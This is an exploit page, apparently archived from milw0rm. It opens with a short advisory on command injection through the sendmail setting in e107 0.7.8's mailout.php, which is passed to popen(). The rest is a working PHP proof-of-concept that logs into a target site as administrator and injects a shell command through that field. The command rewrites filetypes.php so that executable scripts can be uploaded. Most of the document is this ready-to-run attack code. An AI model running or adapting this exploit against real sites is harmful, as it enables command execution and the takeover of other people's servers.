<html><head><title>e107 0.7.8 (mailout.php) Access Escalation Exploit (admin needed)</title></head><pre>&lt;?/*
File: mailout.php
Affects: E107 (v0.7.8) - mailout.php
Date: 12th April 2007

Issue Description:
===========================================================================
mailout.php provides an interface for the site administrator to
send/configure and test email functionality in e107, the problem occurs
because the user can directly change the $mailer parameter which is passed
to a subsequent popen() call when sending a test email. this allows an attacker
to run any command of their choosing on the system
===========================================================================

Scope:
===========================================================================
The scope of the attack is greatly limited by the fact a user would first
need an administrator account on e107 to exploit the vulnerbility however
in these circumstance full system access can be gained.
===========================================================================

Recommendation:
===========================================================================
No known solution at this time
===========================================================================

Discovered By: Gammarays
*/?&gt;


&lt;?php

//E107 - (v0.7.8) Access Escalation Vulnerbility - PoC
//Overwrites filetypes.php allowing the upload of dangerous filetypes

echo &quot;########################################################\n&quot;;
echo &quot;#   Special Greetings To - Timq,Warpboy,The-Maggot     #\n&quot;;
echo &quot;########################################################\n\n\n&quot;;

if($argc!=4) die(&quot;Usage &lt;url&gt; &lt;user&gt; &lt;pass&gt;\n\n\t Ex: http://www.example.com/e107/ usera passb\n&quot;);

$url = $argv[1];
$user = $argv[2];
$pass = $argv[3];

$ch = curl_init($url . &quot;e107_admin/admin.php&quot;);
if(!$ch) die(&quot;Error Initializing CURL&quot;);


//Login
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, &quot;cookie.dat&quot;);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,&quot;authname=&quot;.$user.&quot;&amp;authpass=&quot;.$pass.&quot;&amp;authsubmit=Log+In&quot;);
$res = curl_exec($ch);
if(!$res) die(&quot;Error Connecting To Target&quot;);

echo &quot;[ ]Logging In...\n&quot;;

//Check Login Succeeded
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, &quot;cookie.dat&quot;);
$res = curl_exec($ch);
if(!$res) die(&quot;Error Connecting To Target&quot;);
$res = strstr($res,&quot;administrator.php&quot;);
if(!$res) die(&quot;Error - Invalid Username Or Password&quot;);

echo &quot;[ ]Login Suceeded!\n&quot;;

//Enable upload of everyones favourite filetypes
$cmd = &quot;echo php,php3,exe,gzip,pl,cgi,shtml,sh &gt; filetypes.php&quot;;

curl_setopt($ch, CURLOPT_URL,$url . &quot;/e107_admin/mailout.php?prefs&quot;);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,&quot;testaddress=none@nomail.net&amp;mailer=sendmail&amp;smtp_server=&amp;smtp_username=&amp;smtp_password=&amp;sendmail=&quot;.$cmd.&quot;&amp;mail_pause=3&amp;mail_pausetime=4&amp;mail_bounce_email=&amp;mail_bounce_pop3=&amp;mail_bounce_user=&amp;mail_bounce_pass=&amp;updateprefs=Save+Changes&quot;);
$res = curl_exec($ch);

curl_setopt($ch, CURLOPT_POSTFIELDS,&quot;testemail=Click+to+send+email+to&amp;testaddress=none@nomail.net&amp;mailer=sendmail&amp;smtp_server=&amp;smtp_username=&amp;smtp_password=&amp;mail_pause=3&amp;mail_pausetime=4&amp;mail_bounce_email=&amp;mail_bounce_pop3=&amp;mail_bounce_user=&amp;mail_bounce_pass=&quot;);
$res = curl_exec($ch);

echo &quot;[ ]Upload Of Executable Scripts Enabled\n&quot;;
curl_close($ch);
?&gt;

# milw0rm.com [2007-04-12]</pre></html>